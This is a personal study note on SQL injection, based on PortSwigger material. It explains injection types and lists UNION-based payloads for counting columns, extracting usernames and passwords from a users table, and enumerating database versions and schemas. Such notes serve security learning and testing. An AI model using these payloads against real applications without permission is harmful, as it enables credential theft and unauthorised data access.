# SQL Injection
[Back to Cyber security page](./index.md)

---

## What is Database?
A database is a way of electronically storing collections of data in an organised manner. A database is controlled by a DBMS which is an acronym for  Database Management System, DBMS's fall into two camps Relational or Non-Relational, the focus of this room will be on Relational databases,  some common one's you'll come across are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite. 

---

## SQL
SQL (Structured Query Language) is a feature-rich language used for querying databases, these SQL queries are better referred to as statements.

---

## What is SQL Injection?
The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.

### In-Band SQL Injection
In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.

### Error-Based SQL Injection
This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 

### Union-Based SQL Injection
This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.


---

## SQL injection examples

There are a wide variety of SQL injection vulnerabilities, attacks, and techniques, which arise in different situations. Some common SQL injection examples include:

-   [Retrieving hidden data](https://portswigger.net/web-security/sql-injection#retrieving-hidden-data), where you can modify an SQL query to return additional results.
-   [Subverting application logic](https://portswigger.net/web-security/sql-injection#subverting-application-logic), where you can change a query to interfere with the application's logic.
-   [UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks), where you can retrieve data from different database tables.
-   [Examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database), where you can extract information about the version and structure of the database.
-   [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind), where the results of a query you control are not returned in the application's responses.


### UNION Attacks

SQL injection UNION attacks
> SELECT a, b FROM table1 UNION SELECT c, d FROM table2

Determining the number of columns required in an SQL injection UNION attack
> ' ORDER BY 1-- 
> ' ORDER BY 2-- 
> ' ORDER BY 3-- 
> etc.

>' UNION SELECT NULL-- 
>' UNION SELECT NULL,NULL-- 
>' UNION SELECT NULL,NULL,NULL-- 
>etc.

Finding columns with a useful data type in an SQL injection UNION attack
>' UNION SELECT 'a',NULL,NULL,NULL--
>' UNION SELECT NULL,'a',NULL,NULL--
>' UNION SELECT NULL,NULL,'a',NULL--
>' UNION SELECT NULL,NULL,NULL,'a'--

Using an SQL injection UNION attack to retrieve interesting data
>' UNION SELECT username, password FROM users--

Retrieving multiple values within a single column
>' UNION SELECT username || '~' || password FROM users--

### Examining the database

Retrieving data from other database tables
>SELECT * FROM v$version
>SELECT * FROM information_schema.tables

Querying the database type and version
>Microsoft, MySQL	SELECT @@version
>Oracle	SELECT * FROM v$version
>PostgreSQL	SELECT version()
>For example, you could use a UNION attack with the following input: ' UNION SELECT @@version--

Listing the contents of the database
>Non oracle:
>SELECT * FROM information_schema.tables
>SELECT * FROM information_schema.columns WHERE table_name = 'Users'
>Oracle :
>SELECT * FROM all_tables
>SELECT * FROM all_tab_columns WHERE table_name = 'USERS'


### Blind SQL injection vulnerabilities





---

## Source
- [PortSwigger video](https://youtu.be/wX6tszfgYp4)
- [PortSwigger website](https://portswigger.net/web-security/sql-injection)
- [PortSwigger Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

